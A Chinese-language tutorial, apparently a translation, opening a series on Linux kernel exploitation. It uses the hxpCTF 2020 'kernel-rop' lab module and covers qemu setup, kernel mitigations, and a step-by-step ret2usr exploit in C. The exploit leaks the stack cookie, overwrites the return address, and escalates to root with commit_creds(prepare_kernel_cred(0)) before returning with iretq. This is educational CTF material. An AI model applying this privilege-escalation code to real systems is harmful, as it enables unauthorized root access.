---
title: "Linux内核利用 part 3"
date: 2023-02-05T15:36:08+08:00
draft: false

tags : [                                    
"内核利用",
]
categories : [                              
"内核利用",
]
keywords : [                                
"内核利用",
]
---

#### 前言
在本系列中，我将介绍过去几周学习的Linux内核利用的一些基本内容：从基本环境配置到流行的Linux内核保护措施，以及相应的利用技术。
当我两年前刚开始学习CTF和pwn时，每次我听到别人提及“内核利用”，我感觉它是个很难又很神奇的东西。我尝试过几次，但由于当时对内核和操作系统缺乏充分了解，一直不知道怎么入门。在学习了更多有关计算机科学，特别是操作系统的知识之后，几个星期前，我再次尝试入门内核pwn。我知道对于pwn选手来说，过了这么久才开始学这个主题真的是很晚了，但就像那句话说的——晚学总比不学好。我后来发现这个主题并不像我原先一直认为的那么难（但它当然也不简单，我只学了一些基础知识），它只是需要比普通用户空间利用更多的初始深入知识和设置。因此，它要求pwn选手在开始内核利用之前要非常熟悉用户级利用。
我使用的是`hxpCTF 2020`中一个名为`kernel-rop`的题目提供的环境进行练习。不过我只是使用了该环境，这篇文章并不是题目解析。我选择这个环境的原因是：
1. 环境配置相当典型并且易于根据实践需要进行修改。
2. 内核模块中的漏洞非常基础、简单。
3. 为最新内核版本（截止我写这篇文章时）。
这个系列文章是我可以在将来回顾的模板，如果它也能帮到刚入门Linux内核利用的人，我将非常高兴。
那就让我们开始本系列的第一篇文章吧！我在其中演示了设置Linux内核pwn环境的最基本方法和最基本的利用技术。

#### 配置环境
##### 初探
在Linux内核pwn问题中，我们要在引导时将有漏洞的自定义内核模块安装到内核中并利用它。在大多数情况下，该模块将与一些使用`qemu`作为Linux系统模拟器的文件一起提供。然而，在一些罕见情况下，我们也可能得到`VMWare`或`VirtualBox`虚拟机映像，或者没有任何模拟环境。但以我的经验来说，这非常少见，所以我只介绍由`qemu`模拟的常见情况。
在本次的`kernel-rop`问题中，我们得到了很多文件，但只有这些文件对`qemu`配置有用：
+ `vmlinuz`：压缩的Linux内核，有时也被称为`bzImage`。我们可以将它解压缩到称为`vmlinux`的实际内核ELF文件中。
+ `initramfs.cpio.gz`：用`cpio`和`gzip`压缩的Linux文件系统。`/bin` `/etc`等目录存储在这个文件中，易受攻击的内核模块也可能在该文件系统中。在其他问题中，该文件可能采用其他压缩方案。
+ `run.sh`：包含`qemu`run命令的shell脚本。`qemu`和Linux引导配置可以在此处更改。
让我们更深入地研究这些文件，逐一了解我们应该如何处理它们。

##### 内核
Linux内核通常以`vmlinuz`或`bzImage`的名称给出，它是称为`vmlinux`的内核映像的压缩版本。可以使用`gzip`、`bzip2`、`lzma`等不同的压缩方案。我在这里使用**extract-image.sh**脚本来提取内核ELF文件：
```bash
$ ./extract-image.sh ./vmlinuz > vmlinux
```
提取内核映像是为了在其中找到ROP配件。如果你熟悉用户级pwn，那么你就知道什么是`ROP`，它在内核中没有什么不同（我们将在后面看到）。我个人更喜欢使用`ROPgadget`来做这项工作：
```bash
$ ROPgadget --binary ./vmlinux > gadgets.txt
```
与简单的用户级程序不同，内核映像**很大**。因此，你将等很长时间，`ROPgadget`才能找到所有配件。所以在开始时就立即进行查找比较好。同时应该将输出保存到一个文件中以免多次运行`ROPgadget`来查找不同的配件。

##### 文件系统
同样，这是一个压缩文件，我使用脚本**decompress.sh**进行解压：
```bash
mkdir initramfs
cd initramfs
cp ../initramfs.cpio.gz .
gunzip ./initramfs.cpio.gz
cpio -idm < ./initramfs.cpio
rm initramfs.cpio
```
运行脚本后得到目录`initramfs`，它看起来像Linux机器上文件系统的根目录。我们看到易受攻击的内核模块`hackme.ko`也包含在根目录中。我们将把它复制到其他地方，稍后进行分析。
解压这个文件不仅可以获得易受攻击的模块，还可以根据我们的需要修改文件系统中的某些内容。
首先，我们可以查看`/etc`目录，因为大多数引导后运行的初始化脚本都存储在这里。我们在其中一个文件（通常是`rcS`或`inittab`）中查找以下行，然后修改它：
```bash
setuidgid 1000 /bin/sh
# Modify it into the following
setuidgid 0 /bin/sh
```
这一行代码的目的是在引导后生成一个UID为`1000`的非根shell。将UID修改为`0`之后，我们将在启动时得到一个根shell。你也许想问：我们为什么要这样做？实际上，这看起来相当矛盾。因为我们的目标是利用内核模块来获得根权限，而不是修改文件系统（当然，我们不能修改题目的远程服务器上的文件系统）。这里的根本原因只是为了简化利用过程。在使用利用代码时，有些文件包含对我们有用的信息，但它们需要root权限来读取。例如：
+ `/proc/kallsyms`列出了加载到内核中的所有符号的地址
+ `/sys/module/core/sections/.text`显示了内核的`.text`部分的地址，这也是它的基址（本题中没有`/sys`目录，但可以从`/proc/kallsyms`中检索基址）。
> 运行利用代码时要记得改回`1000`，以免利用时误报（你以为得到了根shell，其实并没有)。

其次，解压文件系统，稍后将利用程序放进去。修改后，使用**compress.sh**脚本将其压缩回指定格式：
```bash
gcc -o exploit -static $1
mv ./exploit ./initramfs
cd initramfs
find . -print0 \
| cpio --null -ov --format=newc \
| gzip -9 > initramfs.cpio.gz
mv ./initramfs.cpio.gz ../
```
前两行编译利用代码并将其放入文件系统。

##### qemu运行脚本
最初，给定的**run.sh**看起来像这样：
```bash
qemu-system-x86_64 \
    -m 128M \
    -cpu kvm64,+smep,+smap \
    -kernel vmlinuz \
    -initrd initramfs.cpio.gz \
    -hdb flag.txt \
    -snapshot \
    -nographic \
    -monitor /dev/null \
    -no-reboot \
    -append "console=ttyS0 kaslr kpti=1 quiet panic=1"
```
部分标志含义：
+ `-m`指定内存大小。如果无法启动模拟器，可以试着增加内存大小。
+ `-cpu`指定CPU模型。我们可以在此处给SMEP和SMAP缓解功能添加`+smep`和`+smap`（稍后详细介绍）。
+ `-kernel`指定压缩内核映像。
+ `-initrd`指定压缩文件系统。
+ `-append`指定额外启动选项。可以在此处启用/禁用缓解功能。
+ 可以在QEMU文档中找到其他选项。
>本题使用`-hdb`将`flag.txt`放到`/dev/sda`中，而不是将其作为一个普通文件留在系统中。这可能是为了防止pwn选手使用一些CTF小伎俩作弊，也可能只是为了让题目环境更易部署。

首先，添加`-s`选项（这个选项允许我们从主机上远程调试模拟器内核）。之后正常启动模拟器，然后在主机上运行：
```bash
$ gdb vmlinux
(gdb) target remote localhost:1234
```
然后就可以正常调试系统内核，就像在普通用户进程中使用`gdb`一样。
>在远程调试内核时，有时`peda`、`pwndbg`和`GEF`表现地很奇怪，你可以用`gdb ——nx vmlinux`命令禁用它们。

其次，我们可以根据实践需求修改保护功能。当然，我们可能不会真的在打CTF时这样做。但我这是在不同场景中练习不同的利用技术，所以修改它们是完全没问题的。

#### Linux内核保护功能
就像用户程序使用ASLR、栈金丝雀、PIE等保护功能，内核也有一组自己的保护功能。下面是一些我在学习内核pwn时会考虑的常见并值得注意的Linux内核保护功能：
+ 内核栈cookie（或金丝雀）：它与用户级的栈金丝雀完全相同。它在编译时在内核中启用，不能禁用。
+ 内核地址空间布局随机化（Kernel address space layout randomization - KASLR）：和用户级的`ASLR`一样，它在每次系统引导时随机加载内核基址。可以通过在`-append`选项下添加`kaslr`或`nokaslr`来启用/禁用它。
+ 管理模式执行保护（Supervisor mode execution protection - SMEP）：当进程处于内核模式时，此功能将页表中所有用户页标记为不可执行。在内核中，这是通过设置控制寄存器`CR4`的`第20位`来实现的。引导时，可以通过向`-cpu`添加`+smep`启用它，向`-append`添加`nosmep`禁用它。
+ 管理模式访问防范（Supervisor Mode Access Prevention - SMAP)：SMAP作为SMEP的补充，当进程处于内核模式时，标记页表中所有用户页为不可访问意味着它们同时也读写。在内核中，SMAP通过设置控制寄存器`CR4`的`第21位`实现。引导时，可以通过向`-cpu`添加`+smap`启用它，向`-append`添加`nosmap`禁用它。
+ 内核页表隔离（Kernel page-table isolation - KPTI）：当此功能启用时，内核完全分离用户空间和内核空间页表。包括内核空间地址和用户空间地址的一组页表只在系统运行在内核模式时使用。用户模式下使用的页表包含用户空间的副本和最小内核空间地址集。它可以通过在`-append`选项下添加`kpti=1`或`nopti`来启用/禁用。
我从启用最简单的保护功能（栈cookies）开始学习，逐渐添加更多功能，以便学习在不同情况下使用的不同技术。
先让我们分析一下易受攻击的**hackme.ko**模块。

#### 分析内核模块
这个模块非常简单。首先，在`hackme_init()`中用以下操作注册一个名为`hackme`的设备：`hackme_read`, `hackme_write`, `hackme_open`和`hackme_release`。这意味着我们可以通过打开`/dev/hackme`与这个模块通信，并对其执行读写操作。
在设备上执行读写操作会调用内核中的`hackme_read()`或`hackme_write()`，它们的代码如下（使用IDA pro并省略了一些不相关内容）：
```c
ssize_t __fastcall hackme_write(file *f, const char *data, size_t size, loff_t *off)
{   
    //...
    int tmp[32];
    //...
    if ( _size > 0x1000 )
    {
        _warn_printk("Buffer overflow detected (%d < %lu)!\n", 4096LL, _size);
        BUG();
    }
    _check_object_size(hackme_buf, _size, 0LL);
    if ( copy_from_user(hackme_buf, data, v5) )
        return -14LL;
    _memcpy(tmp, hackme_buf);
    //...
}

ssize_t __fastcall hackme_read(file *f, char *data, size_t size, loff_t *off)
{   
    //...
    int tmp[32];
    //...
    _memcpy(hackme_buf, tmp);
    if ( _size > 0x1000 )
    {
        _warn_printk("Buffer overflow detected (%d < %lu)!\n", 4096LL, _size);
        BUG();
    }
    _check_object_size(hackme_buf, _size, 1LL);
    v6 = copy_to_user(data, hackme_buf, _size) == 0;
    //...
}
```
这两个函数的漏洞非常明显：它们都读/写一个长度为0x80字节的栈缓冲区，但只有大小大于0x1000时才警告缓冲区溢出。我们可以利用该漏洞自由地读/写内核栈。
现在，让我们看看怎样使用上面的原语得到根权限。首先从尽可能简单的保护功能开始：栈cookie。

#### 最简单的利用——ret2usr
##### 概念
回想一下，当我们刚学用户级pwn时，大多数人应该见过简单的堆栈缓冲区溢出问题，其中`ASLR`是禁用的，`NX`位没有设置。这是一种称为`ret2shellcode`的技术。我们将shellcode放在栈的某个地方，调试找到它的地址，用它覆盖当前函数的返回地址。
返回到用户（即`ret2usr`）想法与其类似。因为我们可以完全控制用户空间中的内容，比起将shellcode放在栈上，我们可以直接把希望程序流跳转到的代码放在用户空间中。之后，我们只需用该地址覆盖内核中正在调用的函数的返回地址。因为易受攻击的函数是一个内核函数，所以即使我们的代码在用户空间中，也要在内核模式下执行。通过这种方式，我们已经实现了任意代码执行。
为了让该技术生效，我们将删除qemu运行脚本中的大部分保护功能（如`+smep`, `+smap`, `kpti=1`, `kaslr`），并添加`nopti`, `nokaslr`。
由于这是本系列的第一个技术，我将一步一步地解释利用过程。

##### 打开设备
在与模块交互之前，我们必须先打开它。打开设备和打开普通文件一样简单：
```c
int global_fd;

void open_dev(){
    global_fd = open("/dev/hackme", O_RDWR);
	if (global_fd < 0){
		puts("[!] Failed to open device");
		exit(-1);
	} else {
        puts("[*] Opened device");
    }
}
```
现在我们就可以读写`global_fd`了。

##### 栈cookie泄漏
因为我们可以读任意栈，栈cookie泄漏很简单。栈上的`tmp`缓冲区0x80字节长，栈cookie紧随其后。因此，如果我们将数据读到一个无符号长数组（每个元素8字节），cookie的偏移量将是16：
```c
unsigned long cookie;

void leak(void){
    unsigned n = 20;
    unsigned long leak[n];
    ssize_t r = read(global_fd, leak, sizeof(leak));
    cookie = leak[16];

    printf("[*] Leaked %zd bytes\n", r);
    printf("[*] Cookie: %lx\n", cookie);
}
```

##### 覆盖返回地址
与栈cookie泄漏相同，我们将创建一个无符号长数组，然后在索引值为16处用泄漏的cookie覆盖原cookie。需要注意的是，与用户程序不同，这个内核函数从栈中弹出`rbx`, `r12`, `rbp`3个寄存器，而不仅仅是`rbp`（可以在反汇编函数时清楚地看到）。因此，我们必须在cookie后面放3个虚拟值。其后放希望程序返回的返回地址，它是我们在用户空间上精心设计以得到根权限的函数。我称之为`escalate_privs`：
```c
void overflow(void){
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = (unsigned long)escalate_privs; // ret

    puts("[*] Prepared payload");
    ssize_t w = write(global_fd, payload, sizeof(payload));

    puts("[!] Should never be reached");
}
```
最后一个问题是我们要在函数中写什么来得到根权限。

##### 获得根权限
再次提醒一下，内核利用的目标不是通过`system("/bin/sh")`或`execve("/bin/sh"， NULL, NULL)`弹出shell，而是在系统中获得根权限，然后弹出根shell。通常，最常见的方法是使用两个函数`commit_creds()`和`prepare_kernel_cred()`，这两个函数就在内核空间代码中。我们需要做的是像这样调用这两个函数：
```c
commit_creds(prepare_kernel_cred(0))
```
由于`KASLR`被禁用，这些函数所在的地址在每次引导中都是不变的。因此，我们可以通过使用这些shell命令读取`/proc/kallsyms`文件轻松获得地址：
```bash
cat /proc/kallsyms | grep commit_creds
-> ffffffff814c6410 T commit_creds
cat /proc/kallsyms | grep prepare_kernel_cred
-> ffffffff814c67f0 T prepare_kernel_cred
```
得到根权限的代码可以这样写（你可以用很多不同的方式来写。它只是简单地连续调用两个函数，使用一个函数的返回值作为另一个函数的参数。我在一篇文章中看到并复制了它）：
```c
void escalate_privs(void){
    __asm__(
        ".intel_syntax noprefix;"
        "movabs rax, 0xffffffff814c67f0;" //prepare_kernel_cred
        "xor rdi, rdi;"
	    "call rax; mov rdi, rax;"
	    "movabs rax, 0xffffffff814c6410;" //commit_creds
	    "call rax;"
        ...
        ".att_syntax;"
    );
}
```
>注意我写代码使用了一种非常干净的方式，在C代码中使用英特尔语法编写内联汇编。

##### 返回用户级
在当前状态下，如果你只是返回用户级代码来弹出shell，那么你会失望的。原因是在运行上述代码之后，我们仍然在内核模式下执行。为了打开根shell，我们必须返回用户模式。
基本上，如果内核正常运行，它将使用以下指令中的一条返回用户级：`sysretq`或`iretq`（x86_64）。大多数人用`iretq`，据我所知这是因为`sysretq`使用更复杂。`iretq`指令只需要用5个用户级寄存器值按以下顺序设置栈：`RIP|CS|RFLAGS|SP|SS`。
进程为这些寄存器跟踪两组不同的值，一组用于用户模式，另一组用于内核模式。因此，在内核模式下完成执行后，它必须恢复到这些寄存器的用户模式值。我们可以简单地设置`RIP`为弹出shell的函数的地址。如果我们随机设置其他寄存器，进程可能不会继续按预期执行。为了解决这个问题，人们想到了一个非常聪明的方法：在进入内核模式之前保存这些寄存器的状态，在获得根权限后重新加载它们。保存状态的函数如下：
```c
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}
```
还有一件事，x86_64上还有一个叫做`swapgs`的指令必须在`iretq`之前被调用。这条指令的目的是在内核模式和用户模式之间交换`GS`寄存器。有了所有这些信息，我们可以完成获得root权限的代码，之后返回用户模式：
```c
unsigned long user_rip = (unsigned long)get_shell;

void escalate_privs(void){
    __asm__(
        ".intel_syntax noprefix;"
        "movabs rax, 0xffffffff814c67f0;" //prepare_kernel_cred
        "xor rdi, rdi;"
	    "call rax; mov rdi, rax;"
	    "movabs rax, 0xffffffff814c6410;" //commit_creds
	    "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}
```
最终，我们可以以指定顺序调用精心设计的代码片段，打开根shell：
```c
int main() {
    save_state();
    open_dev();
    leak();
    overflow();  
    puts("[!] Should never be reached");
    return 0;
}
```

#### 总结
以上就是我关于Linux内核利用学习过程的第一篇文章。在这篇文章中，我演示了如何为Linux内核pwn设置环境，以及内核利用中最简单的技术：`ret2usr`。
在下一篇文章中，我将通过添加越来越多的保护功能来逐渐增加难度，并向您展示相应的绕过技术。

#### 附录
提取内核映像的脚本为[extract-image.sh](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/extract-image.sh)。
解压文件系统的脚本为[decompress.sh](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/decompress.sh)。
编译利用和压缩文件系统的脚本为[compress.sh](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/compress.sh)。
完整的`ret2usr`利用代码是[ret2usr.c](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/ret2usr.c)。

